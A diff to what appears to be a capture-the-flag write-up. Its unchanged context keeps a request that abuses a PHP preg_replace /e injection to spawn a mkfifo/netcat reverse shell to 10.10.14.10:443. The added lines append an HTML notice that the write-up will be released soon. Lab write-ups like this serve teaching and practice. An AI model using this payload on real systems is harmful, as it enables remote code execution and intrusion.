@@ -421,3 +421,45 @@ We change our id for a payload with mkfifo y nc to send a revshell and our data 
 ```console
 $ swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.10+443+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1
 ```
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    .note-containers {
+      max-width: 600px;
+      width: 100%;
+      padding: 20px;
+      background-color: #28a745;
+      color: white;
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      margin: 0 auto; /* Ensures the second container is centered */
+    }
+
+    .note-containers p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+    }
+
+    .note-containers strong {
+      font-weight: bold;
+      font-size: 1.3rem;
+      color: #ffdd57;
+    }
+  </style>
+</head>
+<body>
+  <div class="note-containers">
+    <p>
+      This writeup will be released <strong>soon!</strong>
+    </p>
+  </div>
+</body>
+</html>
+
+
